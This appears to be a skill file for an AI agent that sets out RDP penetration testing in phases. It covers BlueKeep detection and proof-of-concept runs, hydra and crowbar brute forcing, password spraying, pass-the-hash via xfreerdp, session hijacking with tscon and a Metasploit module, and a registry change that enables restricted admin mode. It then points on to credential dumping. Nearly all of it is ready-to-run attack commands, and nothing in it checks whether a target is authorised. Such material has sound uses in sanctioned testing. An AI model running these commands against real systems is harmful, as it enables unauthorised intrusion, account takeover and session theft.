---
name: proto-rdp
description: "RDP security testing — BlueKeep/DejaBlue detection, credential brute force, NLA bypass, RDP session hijacking, pass-the-hash via RDP, restricted admin mode. Triggers: 'rdp', 'remote desktop', 'rdp pentest', 'rdp brute force', 'bluekeep', 'rdp vulnerability', 'rdp attack', 'nla bypass', 'rdp session hijack'."
---

# RDP Security Testing

Assess Remote Desktop Protocol for credential weaknesses and protocol vulnerabilities.

---

## Phase 1: Detection & Enumeration

```bash
TARGET="TARGET_IP"

# Detect RDP:
nmap -p 3389 -sV --script rdp-enum-encryption,rdp-vuln-ms12-020 "$TARGET" 2>/dev/null | tee output/rdp_enum.txt

# NLA check:
nmap -p 3389 --script rdp-enum-encryption "$TARGET" 2>/dev/null | grep -i "CredSSP\|NLA"

# BlueKeep / DejaBlue detection:
nmap -p 3389 --script rdp-vuln-ms19-0708 "$TARGET" 2>/dev/null
# Or:
python3 /opt/bluekeep_poc.py "$TARGET" 2>/dev/null
```

---

## Phase 2: Credential Testing

```bash
TARGET="TARGET_IP"
DOMAIN="TARGET"

# Brute force with hydra:
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://$TARGET -t 1 -V 2>&1 | tee output/rdp_brute.txt

# Crowbar:
crowbar -b rdp -s "$TARGET/32" -u Administrator -C /tmp/passwords.txt 2>/dev/null

# Pass-the-hash via RDP (restricted admin mode):
HASH="aad3b435b51404eeaad3b435b51404ee:NTLM_HASH"
xfreerdp /v:$TARGET /u:Administrator /pth:$HASH /cert-ignore 2>/dev/null

# Spraying via crackmapexec:
crackmapexec rdp "$TARGET" -u users.txt -p "Password123" --continue-on-success 2>/dev/null
```

---

## Phase 3: Session Hijacking

```bash
TARGET="TARGET_IP"

# List active RDP sessions (run on target after admin access):
query session
tscon SESSION_ID /dest:console

# Via Metasploit session hijack module:
# msfconsole: use post/windows/manage/hijack_session

# Enable restricted admin mode (for PTH):
# reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0
```

---

## Output

Save to `output/`:
- `rdp_enum.txt` — encryption and NLA check
- `rdp_brute.txt` — credential brute force results

## Next Phase

→ `post-windows-privesc` after gaining RDP access
→ `post-credential-dumping` for credential harvesting
